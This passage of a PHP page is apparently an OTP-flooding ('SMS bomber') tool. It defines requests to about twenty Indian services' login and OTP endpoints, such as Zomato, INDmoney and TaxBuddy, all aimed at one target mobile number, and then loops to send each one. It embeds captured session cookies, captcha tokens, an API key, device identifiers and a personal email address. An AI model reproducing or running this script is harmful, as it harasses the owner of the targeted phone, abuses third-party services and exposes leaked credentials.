                        "cookie: mp_622d6bf65dcee1d7e8534dc052770bdf_mixpanel=%7B%22distinct_id%22%3A%22%24device%3A450426a4-60f7-4122-b527-a3fdf4672140%22%2C%22%24device_id%22%3A%22450426a4-60f7-4122-b527-a3fdf4672140%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fl.wl.co%2F%22%2C%22%24initial_referring_domain%22%3A%22l.wl.co%22%2C%22__mps%22%3A%7B%7D%2C%22__mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fl.wl.co%2F%22%2C%22%24initial_referring_domain%22%3A%22l.wl.co%22%7D%2C%22__mpus%22%3A%7B%7D%2C%22__mpa%22%3A%7B%7D%2C%22__mpu%22%3A%7B%7D%2C%22__mpr%22%3A%5B%5D%2C%22__mpap%22%3A%5B%5D%7D",
                        "cookie: mwut=aeabc47d-5e73-4e9d-94cc-7284d55458f2",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["phoneNumber" => $mobile, "resend" => true, "source" => ""])
                ],
                [
                    'url' => "https://auricle.co.in/login/send_otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: auricle.co.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "x-requested-with: XMLHttpRequest",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: */*",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                        "sec-ch-ua-mobile: ?1",
                        "origin: https://auricle.co.in",
                        "sec-fetch-site: same-origin",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://auricle.co.in/login",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: ci_session=f8t1j9c9bvqjpjg7lnefqs2ogovglc79",
                        "priority: u=1, i"
                    ],
                    'data' => "mobile_number=$mobile_with_plus&country_code=%2B91&key_code=%40Abc67890"
                ],
                [
                    'url' => "https://auricle.co.in/login/resend_otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: auricle.co.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "x-requested-with: XMLHttpRequest",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: */*",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                        "sec-ch-ua-mobile: ?1",
                        "origin: https://auricle.co.in",
                        "sec-fetch-site: same-origin",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://auricle.co.in/login",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: ci_session=f8t1j9c9bvqjpjg7lnefqs2ogovglc79",
                        "priority: u=1, i"
                    ],
                    'data' => "mobile_number=$mobile_with_plus&country_code=%2B91&key_code=%40Abc67890"
                ],
                [
                    'url' => "https://apixt-iw.indmoney.com/indshield/public/ext/v4/otp/generate",
                    'method' => 'POST',
                    'headers' => [
                        "Host: apixt-iw.indmoney.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/json",
                        "sec-ch-ua-mobile: ?1",
                        "platform: web",
                        "accept: */*",
                        "origin: https://www.indmoney.com",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.indmoney.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode([
                        "countryCode" => "+91",
                        "mobile" => $mobile,
                        "identity_token" => "0cAFcWeA5MLvUwxbEgqxejldEL6ChgknuImpcxqfPhB2JYXVvjkWh2vdDDNZtdQzgt2rAyUrlJ8SIRArQctSeJoqTdOlp0OjzgJIMXTudZUBHNNLj7eovYJs7M1smRxW9OZCc1M7sBQVRV-EVdvDqIRQSfKFR1uL4VQRkdMJusvtAFjCXHD235ssJRU5c2zH3QcoTGBmi43HJIF1ct4O1DaLYtutmzsQK0nMkxQsuIygyFW4KoqURcTD4iJ3j1C3tf2LG-lrUMpbgP6hLTUiHGSTRuNZz7qcuZ1bz0LVFcsTw5U1sLv67Y8-qUd05iHfdwZHe2vC9gtj6mP9I4_w0u4k4uZTg9CRrqq3vSpz35GM2zRyOW0x0yzJvJ6OHpOZtY9UmsB3KKfPWO032S4dEFKIdF6gzPVHkatt8BQOUi7q4klJZxCSWJD6snpf64D4Oz_YLpFicap2l9HUvpYuRIOQG58RmiXy6tm0UczIqPlOJdUn90P_ec2ZusGFjO5m3K_Tvq3ztscnJ5OiRlaFY0_uxxDG23GFYLjFbnWzaq8uLba0ItfDVhqn0IpIKtLgLLo3C4ZFacl-IlYtuwb-ulrEepdNEipE8-qJ1gxCDIpanxgXx8jTmmwcV7JE-_KPyxRbTbJI9ipDOar5sCU72C2fqoBMGB-HsRXLFwZR7d8vOQTPtBATpiOa1idnxVT5nBZbv-C6zY1lW40pa5lrbL-ybbbAnOoCdllYWz0R0WshPKcZamBzrtYG0BYG1ZHyEoRmmnoSsUJ2Vk0i6eiK31MMIGskhvWxmhLiP2-qpt3Tmfhq9tuQAaU94"
                    ])
                ],
                [
                    'url' => "https://apixt-iw.indmoney.com/indshield/public/ext/v4/otp/generate?resend=1",
                    'method' => 'POST',
                    'headers' => [
                        "Host: apixt-iw.indmoney.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/json",
                        "sec-ch-ua-mobile: ?1",
                        "platform: web",
                        "accept: */*",
                        "origin: https://www.indmoney.com",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.indmoney.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode([
                        "countryCode" => "+91",
                        "mobile" => $mobile,
                        "identity_token" => "0cAFcWeA5-YS9mugBnn9gKixAuhBNb_U5qzXFTpkFr7RjG4lXSSZJilzciuyZ_akiEuDd6hGFFjxVnHoD-qbBXfH60DSx8rEFpQ08-S54kmQCusJrJev3xBGvNteRCbSB_jKFxhnZwnKxeAMSu_4NLDs_W4UMagcA0HjmNTUVlZQrK64dO_AqQ560xKA0J2-7_q3XU_cpSiIVfC9-lQ13zs26aACs7bz1YFTsmdw2aXNfPVKCfS1ZQz6Kwfpwl1UsHsNfl5baqlj0S7743pu47AvAWB6Dxdny7ep8VGdXk1G4HeZk-XonzjLxQTMQSlm6ts1E3ywPw9Cg9zXeo_pKmgqgcckgyR8urk1yvMEx7ICVT3s2dIWFDcvRcmBb8O15iSUySZiOmX5ApYQCooRzbj6qAZM939EiQMrcTxBZfFsOZ4O-EJb2rgMKf2BkR79n1VTRYh4wTZSW6P71aIeQm4aZ4oQ29K7omT2eHoHfpT_QrD6pVB-JVvDhEMfWtXjC_Qdq1IwJu7sRNpM-QEHmU0iVz1o4dNjRTlB_aHE0NVEvTyX4sH_inwj2glchp7ZNNwwPpgLVo-M_6wLUkYNedYTO_12OGwgYO5OEe7h_EeTone09COfdlkw5OCMRg_sV09-9A7M6s5VpIUZm0T_gCdvUZRUJNWNtU28cYCk9QZfnKaSffKOVCHZk40mafL15Ky85xkmikNFUQWFw4jp0pwof05vPo4Pv6Tuti-4G9kXbm3vzOCuKQ-KWNX6vNV2o0ugalOTaSqWwc"
                    ])
                ],
                [
                    'url' => "https://api.riggleapp.in/api/v1/user/auth/send_otp/",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.riggleapp.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "x-app-name: plug",
                        "content-type: application/json",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "sec-ch-ua-mobile: ?1",
                        "origin: https://app.riggleapp.in",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://app.riggleapp.in/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["mobile" => $mobile, "agreement" => true])
                ],
                [
                    'url' => "https://authorize.api.nathabit.in/v2/auth/v2/otp/",
                    'method' => 'POST',
                    'headers' => [
                        "Host: authorize.api.nathabit.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/json",
                        "sec-ch-ua-mobile: ?1",
                        "accept: */*",
                        "origin: https://nathabit.in",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://nathabit.in/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["phone" => $mobile, "send_on_whatsapp" => true, "address_consent" => false, "email" => "sdhabai01@gmail.com"])
                ],
                [
                    'url' => "https://authorize.api.nathabit.in/v2/auth/v2/otp/",
                    'method' => 'POST',
                    'headers' => [
                        "Host: authorize.api.nathabit.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/json",
                        "sec-ch-ua-mobile: ?1",
                        "accept: */*",
                        "origin: https://nathabit.in",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://nathabit.in/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["phone" => $mobile, "send_on_whatsapp" => false, "address_consent" => false, "email" => "sdhabai01@gmail.com"])
                ],
                [
                    'url' => "https://api.taxbuddy.com/user/otp/mail?mobileNumber=$mobile&isOtpOnWhatsApp=true",
                    'method' => 'GET',
                    'headers' => [
                        "Host: api.taxbuddy.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "authorization: Bearer null",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: application/json",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/json",
                        "sec-ch-ua-mobile: ?1",
                        "origin: https://itr.taxbuddy.com",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://itr.taxbuddy.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => null
                ],
                [
                    'url' => "https://nspac.ac.in/control/signin.php",
                    'method' => 'POST',
                    'headers' => [
                        "Host: nspac.ac.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "x-requested-with: XMLHttpRequest",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: */*",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                        "sec-ch-ua-mobile: ?1",
                        "origin: https://nspac.ac.in",
                        "sec-fetch-site: same-origin",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://nspac.ac.in/login.php",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: PHPSESSID=0d6861b840290e9171239ee0cb71d215",
                        "cookie: cust_offline=pco",
                        "cookie: cust_offline_id=PC175886683086065",
                        "priority: u=1, i"
                    ],
                    'data' => "action=signin&phone=$mobile"
                ],
                [
                    'url' => "https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api-shop-in.savana.com",
                        "x-adjust-id: 1a13176f364f2728bf7b75b356db4ffb",
                        "app_version: 8.42.0.3",
                        "app_instance_id: 638745b3e36652cf99a1a2d7eefe870c",
                        "client_type: android-app",
                        "uuid: ___X_2bb47f95f71698b8a40b8bf3ee45899051d0c164c",
                        "vtoken: 2388796999",
                        "h5-version: 3.0.63",
                        "android-version: 8.42.0.3",
                        "device_uid: 2bb47f95f71698b8a40b8bf3ee45899051d0c164c",
                        "country-language: en-IN",
                        "x-platform: android",
                        "x-device: google, Pixel 4",
                        "x-idfa: ___X_2bb47f95f71698b8a40b8bf3ee45899051d0c164c",
                        "x-os-version: 11",
                        "x-forter-token: 2bb47f95f71698b8a40b8bf3ee45899051d0c164c",
                        "x-app-version: 8.42.0.3",
                        "user-agent: Mozilla/5.0 (Linux; Android 11; en-IN; google; Pixel 4; 5.3GB) BrowserKernel/APP Browser/APP NetType/WIFI Platform/(country:IN; language:en-IN; shell:savana/app/android/8.42.0.3; fp:)",
                        "trace_id: d87c14eb-a5a1-4f5d-881b-f88f78ada1a0",
                        "content-type: application/json; charset=UTF-8",
                        "accept-encoding: gzip"
                    ],
                    'data' => json_encode(["bizTraceId" => "1fcbd24dafaf40b0bd4a4e9641cb140c", "channel" => 2, "phonePrefix" => "+91", "type" => 0, "userName" => $mobile])
                ],
                [
                    'url' => "https://www.legalkart.com/api/v2/customer/register",
                    'method' => 'POST',
                    'headers' => [
                        "Host: www.legalkart.com",
                        "Connection: keep-alive",
                        "sec-ch-ua-platform: \"Android\"",
                        "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "Accept: application/json, text/plain, */*",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "Content-Type: application/json",
                        "sec-ch-ua-mobile: ?1",
                        "Origin: https://www.legalkart.com",
                        "X-Requested-With: mark.via.gp",
                        "Sec-Fetch-Site: same-origin",
                        "Sec-Fetch-Mode: cors",
                        "Sec-Fetch-Dest: empty",
                        "Referer: https://www.legalkart.com/consumer/",
                        "Accept-Encoding: gzip, deflate, br, zstd",
                        "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
                        "Cookie: utm_source=j%3Anull; id=s%3A8yRBrAmHcVxs8zg04lNDqfCVgvfTOz_T.oSbzF1fAbavAlgjUyeZ531KOQvburFnyzQccfxw7BV0"
                    ],
                    'data' => json_encode(["mobile" => $mobile, "country_code" => 102, "device_fcm_id" => "", "device" => "web"])
                ],
                                [
                    'url' => "https://api.turftown.in/api/v2/user/send_otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.turftown.in",
                        "accept: application/json, text/plain, */*",
                        "access-control-allow-origin: *",
                        "x-access-token: ",
                        "app-version: 3.0.620",
                        "os-version: android",
                        "device-id: f602392e76d484d0",
                        "content-type: application/json",
                        "accept-encoding: gzip",
                        "user-agent: okhttp/5.0.0-SNAPSHOT"
                    ],
                    'data' => json_encode(["phone" => $mobile, "merchant-id" => "tt"])
                ],
                [
                    'url' => "https://api.turftown.in/api/v3/user/m",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.turftown.in",
                        "accept: application/json, text/plain, */*",
                        "access-control-allow-origin: *",
                        "x-access-token: ",
                        "app-version: 3.0.620",
                        "os-version: android",
                        "device-id: f602392e76d484d0",
                        "content-type: application/json",
                        "accept-encoding: gzip",
                        "cookie: AWSALB=VUOfPt0L85f6DkoLLT6heSqtjFFJVq557hE9uGmO6X+4U72y/bBn8ScrEI2ox5vpORyKjDAqj1CIEjAcdDzeU0nnmIYiQqo/jcezhG/vnNCmo4e3JcoQdC/u1OmS; AWSALBCORS=VUOfPt0L85f6DkoLLT6heSqtjFFJVq557hE9uGmO6X+4U72y/bBn8ScrEI2ox5vpORyKjDAqj1CIEjAcdDzeU0nnmIYiQqo/jcezhG/vnNCmo4e3JcoQdC/u1OmS",
                        "user-agent: okhttp/5.0.0-SNAPSHOT"
                    ],
                    'data' => json_encode(["phone" => $mobile, "merchant-id" => "tt"])
                ],
                [
                    'url' => "https://cityfurnish.com/v1/user/sendotp_new",
                    'method' => 'POST',
                    'headers' => [
                        "Host: cityfurnish.com",
                        "content-type: multipart/form-data; boundary=7e6d07a6-7e1a-4287-9f30-d6d0548dc06a",
                        "accept-encoding: gzip",
                        "user-agent: okhttp/4.10.0"
                    ],
                    'data' => "--7e6d07a6-7e1a-4287-9f30-d6d0548dc06a\r\n" .
                              "content-disposition: form-data; name=\"mobile_number\"\r\n" .
                              "Content-Length: 10\r\n\r\n" .
                              $mobile . "\r\n" .
                              "--7e6d07a6-7e1a-4287-9f30-d6d0548dc06a\r\n" .
                              "content-disposition: form-data; name=\"channel\"\r\n" .
                              "Content-Length: 8\r\n\r\n" .
                              "whatsapp\r\n" .
                              "--7e6d07a6-7e1a-4287-9f30-d6d0548dc06a--\r\n"
                ],
                [
                    'url' => "https://api.kult.in/api/v2/otp/send?phone_number=$mobile&country_id=106",
                    'method' => 'GET',
                    'headers' => [
                        "Host: api.kult.in",
                        "kult_device_id: ",
                        "auth-token: ",
                        "accept-encoding: gzip",
                        "user-agent: okhttp/4.11.0",
                        "timestamp: 1759483139717",
                        "content-type: application/json; charset=utf-8",
                        "accept: application/json",
                        "device-type: Android",
                        "release-version: 1.1.6",
                        "build-version: 48",
                        "bundle-identifier: beauty.kult.app"
                    ],
                    'data' => null
                ],
                [
                    'url' => "https://api.edition.in/gw/auth/generate_otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.edition.in",
                        "x-locale-info: timezone=19800000&lang=en&country=IN",
                        "x-is-dining-supported: false",
                        "x-gps-permission-given: 1",
                        "x-request-id: 13540618-4079-442e-8bb9-72d7f7229dc4",
                        "x-is-movies-supported: false",
                        "x-is-gps-precise-location-enabled: 1",
                        "x-is-granular-loc: false",
                        "x-device-pixel-ratio: 2.0",
                        "x-is-shopping-supported: false",
                        "x-is-events-supported: false",
                        "x-app-version: 2.17.1",
                        "x-device-width: 720",
                        "x-device-id: c6216bd5-59a0-4a7b-a462-07e78f4b9ace",
                        "x-timezone-identifier: Asia/Kolkata",
                        "x-device-height: 1184",
                        "x-app-type: ed_android",
                        "x-client-id: ed_android",
                        "x-device-gps-enabled: 1",
                        "x-is-loc-unsupported: false",
                        "x-app-launch-count: 1",
                        "x-jumbo-session-id: 15f35f8e-c215-46e1-a784-494ef903a9961759483325",
                        "x-zomato-trace-id: 13540618-4079-442e-8bb9-72d7f7229dc4",
                        "x-notification-permission-granted: 1",
                        "accept-encoding: br, gzip",
                        "accept: application/x-protobuf",
                        "x-app-theme: default",
                        "x-app-appearance: DARK",
                        "x-system-appearance: DARK",
                        "x-accessibility-voice-over-enabled: 0",
                        "content-type: application/x-protobuf",
                        "user-agent: okhttp/5.0.0-alpha.14"
                    ],
                    'data' => "$mobile +91"
                ],
                [
                    'url' => "https://api.edition.in/gw/auth/generate_otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.edition.in",
                        "x-locale-info: timezone=19800000&lang=en&country=IN",
                        "x-is-dining-supported: false",
                        "x-gps-permission-given: 1",
                        "x-request-id: b31b0d7d-ddfa-4055-a4d2-71dd1d2be184",
                        "x-is-movies-supported: false",
                        "x-is-gps-precise-location-enabled: 1",
                        "x-is-granular-loc: false",
                        "x-device-pixel-ratio: 2.0",
                        "x-is-shopping-supported: false",
                        "x-is-events-supported: false",
                        "x-app-version: 2.17.1",
                        "x-device-width: 720",
                        "x-device-id: c6216bd5-59a0-4a7b-a462-07e78f4b9ace",
                        "x-timezone-identifier: Asia/Kolkata",
                        "x-device-height: 1184",
                        "x-app-type: ed_android",
                        "x-client-id: ed_android",
                        "x-device-gps-enabled: 1",
                        "x-is-loc-unsupported: false",
                        "x-app-launch-count: 1",
                        "x-jumbo-session-id: 15f35f8e-c215-46e1-a784-494ef903a9961759483325",
                        "x-zomato-trace-id: b31b0d7d-ddfa-4055-a4d2-71dd1d2be184",
                        "x-notification-permission-granted: 1",
                        "accept-encoding: br, gzip",
                        "accept: application/x-protobuf",
                        "x-app-theme: default",
                        "x-app-appearance: DARK",
                        "x-system-appearance: DARK",
                        "x-accessibility-voice-over-enabled: 0",
                        "content-type: application/x-protobuf",
                        "user-agent: okhttp/5.0.0-alpha.14"
                    ],
                    'data' => "$mobile +91"
                ],
                [
                    'url' => "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.4.3",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.kpnfresh.com",
                        "x-app-id: 44e05430-25da-456b-8455-ed45f32e02bf",
                        "x-app-version: 3.4.3",
                        "x-user-journey-id: 210333e3-f1a6-4f7b-964a-fedc1a0f6072",
                        "content-type: application/json; charset=UTF-8",
                        "accept-encoding: gzip",
                        "user-agent: okhttp/5.1.0"
                    ],
                    'data' => json_encode([
                        "notification_channel" => "WHATSAPP",
                        "phone_number" => [
                            "country_code" => "+91",
                            "number" => $mobile
                        ]
                    ])
                ],
                [
                    'url' => "https://accounts.zomato.com/login/phone",
                    'method' => 'POST',
                    'headers' => [
                        "Host: accounts.zomato.com",
                        "x-appsflyer-uid: 1757014800141-4232203522914064433",
                        "x-present-lat: 0.0",
                        "x-perf-class: PERFORMANCE_LOW",
                        "x-user-defined-lat: 0.0",
                        "x-bluetooth-on: false",
                        "x-jumbo-session-id: b3fd29da-5ec8-4d5f-a549-cb3df13fceb01757014800",
                        "user-agent: &source=android_market&version=9&device_manufacturer=google&device_brand=google&device_model=Pixel+4&api_version=907&app_version=v19.0.7",
                        "x-device-language: en",
                        "x-rider-installed: false",
                        "x-district-installed: false",
                        "x-zomato-client-id: 5276d7f1-910b-4243-92ea-d27e758ad02b",
                        "x-present-long: 0.0",
                        "x-client-id: zomato_android_v2",
                        "x-network-type: wifi",
                        "x-zomato-uuid: b76bf33c-ac5b-4d09-b8b8-d72158ad885e",
                        "x-app-language: &lang=en&android_language=en&android_country=",
                        "x-firebase-instance-id: 4f96385a0f9e376586c62bab082475bd",
                        "x-device-pixel-ratio: 2.0",
                        "x-o2-city-id: -1",
                        "x-android-id: 91b0089293a78780",
                        "x-zomato-app-version-code: 1710019070",
                        "accept: image/webp",
                        "x-present-horizontal-accuracy: 0",
                        "x-request-id: d1c87bc8-12b1-4078-b6da-a719fe9469f8",
                        "x-zomato-app-version: 907",
                        "x-city-id: -1",
                        "x-device-width: 720",
                        "pragma: akamai-x-get-request-id,akamai-x-cache-on, akamai-x-check-cacheable",
                        "x-vpn-active: 0",
                        "x-app-session-id: 792cbf10-f477-4834-80cc-5625fdb2f449",
                        "x-device-height: 1184",
                        "x-user-defined-long: 0.0",
                        "x-installer-package-name: android",
                        "x-blinkit-installed: false",
                        "x-access-uuid: ae263630-584e-466f-92ad-df602fdbe171",
                        "x-accessibility-dynamic-text-scale-factor: 1.0",
                        "x-zomato-api-key: 7749b19667964b87a3efc739e254ada2",
                        "x-dv-token: DT_3je13a4nLeYmvnG8fALTDDwhDuWwlWapxEeB2nExrcU",
                        "user-bucket: 0",
                        "user-high-priority: 0",
                        "is-akamai-video-optimisation-enabled: 0",
                        "accept-encoding: br, gzip",
                        "x-app-theme: default",
                        "x-app-appearance: LIGHT",
                        "x-system-appearance: UNSPECIFIED",
                        "x-accessibility-voice-over-enabled: 0",
                        "content-type: application/x-www-form-urlencoded",
                        "cookie: zxcv=YW2Bj5c4gEo3dtBvtJzey0Y9P5-6Aw8KAnvXfLD_eh8; rurl=https://accounts.zomato.com/zoauth/callback; cid=5276d7f1-910b-4243-92ea-d27e758ad02b; oauth2_authentication_csrf=MTc1NzAxNTM0N3xEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR1l4WW1aaFpERTFZamc0TlRRMFlXWmlZV00yWVRFd01XVXdNMk0yTURFNHxi9xj-CpsGNKqDDEXFF33a85BC5YOCLmcAuo2kUzKJUQ==; ak_bmsc=6DF0F9BA47E07BA8DF7AFA0CE0CCAFDD~000000000000000000000000000000~YAAQ7UxhaOJYmxWZAQAAXo9GFh175OOPf5qmrq2P7hB/yJ4piqF2lHeKOwKKzVj79zd7S5MGYXLcvwVI2HNHbYCpBcSUVTfEg17Tam86VzWjAiObBtwhUX2kxGMPIjOjvlGWgVE6vdiyB1tF9Z2d/GOMxDumuczw74a407jsVQQOqSv6TiCvztAReFhIl2ywrIFSplmB73ZJpjjS+bpDGw8s3dV2w+C1RMQ5yjILuao81wqCMKJYMAZFz+XXBo1pTwCAebMmpN+m9J/18s/q1s4kqpubrRzWavFXCQvTNSj8O34FYXFx9MaWnpw8IdjJgsBYCohSiOf+lK1Yb7lfvzzLk6kTp87/1Wh4LUMNItl6mbzE5CLtJHGr+c3aug+EvBR4t6vf98Gdh1oM; csrf=75aa5980900f08b5d375ed38271972e5; fbcity=14; zl=en; fbtrack=796b458d425a1a82d0f26db6310887e1"
                    ],
                    'data' => "number=$mobile&country_id=1&lc=af07c17656e641efbfcc489f51aea946&type=initiate&verification_type=whatsapp&package_name=&message_uuid="
                ]
            ];

            // Execute APIs and display responses
            echo "<h3>API Responses</h3>";
            foreach ($apis as $index => $api) {
                // Dynamically set content-length header if data is present
                $headers = $api['headers'];
                if ($api['data']) {
                    $headers[] = "content-length: " . strlen($api['data']);
                }
                $result = makeRequest($api['url'], $api['method'], $headers, $api['data']);
                echo "<div class='response'>";
                echo "<h4>API " . ($index + 1) . ": {$api['url']}</h4>";
                echo "<strong>HTTP Code:</strong> {$result['http_code']}<br>";
                if ($result['error']) {
                    echo "<strong>Error:</strong> {$result['error']}<br>";
                } else {
                    echo "<strong>Response:</strong> " . htmlspecialchars($result['response']) . "<br>";
                }
                echo "</div>";
            }
        }
        ?>
    </div>
</body>
</html>